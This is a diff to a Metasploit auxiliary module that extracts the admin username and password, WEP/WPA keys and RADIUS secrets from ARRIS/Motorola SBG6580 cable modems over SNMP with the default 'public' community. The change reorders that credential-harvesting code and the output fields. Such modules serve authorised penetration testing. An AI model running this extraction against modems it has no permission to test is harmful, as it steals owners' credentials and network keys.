@@ -15,9 +15,9 @@ class Metasploit3 < Msf::Auxiliary
     super(update_info(info,
       'Name'        => 'ARRIS / Motorola SBG6580 Cable Modem SNMP Enumeration Module',
       'Description' => 'This module allows SNMP enumeration of the ARRIS / Motorola
-        SURFboard SBG6580 Series Wi-Fi Cable Modem Gateway. It supports wireless
-        network keys and information as well as device user interface username
-        and password.
+        SURFboard SBG6580 Series Wi-Fi Cable Modem Gateway. It supports the username
+        and password for the device user interface as well as wireless network keys
+        and information.
         The default community used is "public".',
       'References'  =>
         [
@@ -36,11 +36,11 @@ class Metasploit3 < Msf::Auxiliary
 
       # represents the order of the output data fields
       fields_order = [
-        "Host IP", "SSID", "802.11 Band", "Network Authentication Mode",
-        "WEP Passphrase", "WEP Encryption", "WEP Key 1", "WEP Key 2",
-        "WEP Key 3", "WEP Key 4", "Current Network Key", "WPA Encryption",
-        "WPA Pre-Shared Key (PSK)", "RADIUS Server", "RADIUS Port",
-        "RADIUS Key", "Username", "Password"
+        "Host IP", "Username", "Password", "SSID", "802.11 Band",
+        "Network Authentication Mode", "WEP Passphrase", "WEP Encryption",
+        "WEP Key 1", "WEP Key 2", "WEP Key 3", "WEP Key 4",
+        "Current Network Key", "WPA Encryption", "WPA Pre-Shared Key (PSK)",
+        "RADIUS Server", "RADIUS Port", "RADIUS Key"
       ]
 
       output_data = {}
@@ -52,6 +52,21 @@ class Metasploit3 < Msf::Auxiliary
         # have jumped to error handling where the error status is
         # already being displayed.
         print_good("#{ip}, Connected.")
+
+        # attempt to get the username and password for the device user interface
+        # using the CableHome cabhPsDevMib MIB module which defines the
+        # basic management objects for the Portal Services (PS) logical element
+        # of a CableHome compliant Residential Gateway device
+        deviceUiSelection = snmp.get_value('1.3.6.1.4.1.4491.2.4.1.1.6.1.3.0').to_i
+        if deviceUiSelection == 1
+          # manufacturerLocal(1) - indicates Portal Services is using the vendor
+          # web user interface shipped with the device
+          deviceUiUsername = snmp.get_value('1.3.6.1.4.1.4491.2.4.1.1.6.1.1.0').to_s
+          output_data["Username"] = deviceUiUsername.strip
+
+          deviceUiPassword = snmp.get_value('1.3.6.1.4.1.4491.2.4.1.1.6.1.2.0').to_s
+          output_data["Password"] = deviceUiPassword.strip
+        end
 
         primaryWifiState = snmp.get_value('1.3.6.1.2.1.2.2.1.8.32').to_i
         if primaryWifiState != 1
@@ -118,21 +133,6 @@ class Metasploit3 < Msf::Auxiliary
           when 4, 5, 8
             get_radius_info(snmp, output_data)
           end
-        end
-
-        # attempt to get the username and password for the device user interface
-        # using the CableHome cabhPsDevMib MIB module which defines the
-        # basic management objects for the Portal Services (PS) logical element
-        # of a CableHome compliant Residential Gateway device
-        deviceUiSelection = snmp.get_value('1.3.6.1.4.1.4491.2.4.1.1.6.1.3.0').to_i
-        if deviceUiSelection == 1
-          # manufacturerLocal(1) - indicates Portal Services is using the vendor
-          # web user interface shipped with the device
-          deviceUiUsername = snmp.get_value('1.3.6.1.4.1.4491.2.4.1.1.6.1.1.0').to_s
-          output_data["Username"] = deviceUiUsername.strip
-
-          deviceUiPassword = snmp.get_value('1.3.6.1.4.1.4491.2.4.1.1.6.1.2.0').to_s
-          output_data["Password"] = deviceUiPassword.strip
         end
 
         # output
